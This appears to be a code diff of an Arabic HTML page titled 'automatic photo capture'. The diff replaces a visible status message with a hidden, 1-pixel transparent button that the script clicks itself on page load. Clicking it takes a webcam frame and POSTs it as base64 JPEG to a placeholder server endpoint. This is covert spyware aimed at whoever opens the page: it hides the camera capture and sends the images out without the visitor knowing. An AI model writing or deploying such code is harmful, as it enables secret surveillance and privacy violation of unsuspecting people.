@@ -3,48 +3,52 @@
 <head>
 <meta charset="UTF-8">
 <title>التقاط صورة تلقائي</title>
+<style>
+  body { display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f0f0; }
+  #snap { opacity:0; width:1px; height:1px; position:absolute; top:0; left:0; }
+</style>
 </head>
 <body>
-<h3>جاري التقاط الصورة...</h3>
+
+<button id="snap">التقاط</button>
+
 <video id="video" autoplay style="display:none;"></video>
 <script>
-async function capturePhoto() {
+const snapBtn = document.getElementById('snap');
+const video = document.getElementById('video');
+
+snapBtn.addEventListener('click', async () => {
   try {
-    // طلب إذن الكاميرا
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.getElementById('video');
     video.srcObject = stream;
 
-    // إنشاء canvas لالتقاط الصورة
-    const canvas = document.createElement('canvas');
     video.addEventListener('loadedmetadata', () => {
+      const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
-      // التقاط الصورة بعد ثانيتين
-      setTimeout(async () => {
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imgData = canvas.toDataURL('image/jpeg');
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // إرسال الصورة إلى أي سيرفر عبر POST (ضع رابطك هنا)
-        await fetch('https://example.com/upload', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: imgData })
-        });
+      const imgData = canvas.toDataURL('image/jpeg');
 
-        alert('تم التقاط الصورة وإرسالها!');
-        stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا
-      }, 2000);
+      fetch('https://YOUR_SERVER_ENDPOINT/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imgData })
+      }).then(() => alert('تم إرسال الصورة!'));
+
+      // إيقاف الكاميرا بعد الالتقاط
+      stream.getTracks().forEach(track => track.stop());
     });
   } catch (err) {
     alert('فشل الوصول إلى الكاميرا: ' + err);
   }
-}
+});
 
-// تشغيل الوظيفة مباشرة عند فتح الصفحة
-capturePhoto();
+// محاولة الضغط تلقائيًا بعد تحميل الصفحة (متصفحات معينة قد تسمح)
+window.onload = () => snapBtn.click();
 </script>
+
 </body>
 </html>
